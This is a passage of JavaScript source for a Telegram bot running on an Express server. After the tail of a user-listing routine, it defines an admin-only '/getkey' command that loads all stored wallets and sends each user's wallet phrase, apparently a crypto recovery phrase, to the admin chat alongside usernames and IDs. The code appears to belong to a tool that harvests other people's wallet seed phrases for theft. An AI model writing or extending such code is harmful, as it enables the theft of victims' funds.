    const expiresIn = Math.ceil(
      (user.ttl - (Date.now() - user.timestamp)) / (60 * 60 * 1000),
    );

    message += `${idx + 1}. ${name}\n`;
    message += `ID: ${user.id}\n`;
    message += `Username: ${username}\n`;
    message += `Expires in: ${expiresIn}h\n\n`;
  });

  for (let i = 0; i < message.length; i += 3900) {
    bot.sendMessage(chatId, message.slice(i, i + 3900));
  }
});

// Admin command to view all wallets
bot.onText(/\/getkey/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  // Check if user is admin
  if (!ADMIN_IDS.includes(userId)) {
    bot.sendMessage(
      chatId,
      "❌ You don't have permission to access this command.",
    );
    return;
  }

  const wallets = loadActiveWallets();

  if (Object.keys(wallets).length === 0) {
    bot.sendMessage(chatId, "📋 No wallets stored yet.");
    return;
  }

  let message = "🔐 All Stored Wallets\n\n";

  for (const [storedUserId, userData] of Object.entries(wallets)) {
    message += `👤 ${userData.username || "Unknown"} (ID: ${storedUserId})\n`;
    userData.wallets.forEach((w, idx) => {
      const expiresIn = Math.ceil(
        (w.ttl - (Date.now() - w.timestamp)) / (60 * 60 * 1000),
      );
      message += `├─ Wallet ${idx + 1}: ${w.phrase}\n`;
      message += `│  └─ Expires in: ${expiresIn}h\n`;
    });
    message += "\n";
  }

  bot.sendMessage(chatId, message);
});
app.get("/", (req, res) => {
  res.send("Bot is running");
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
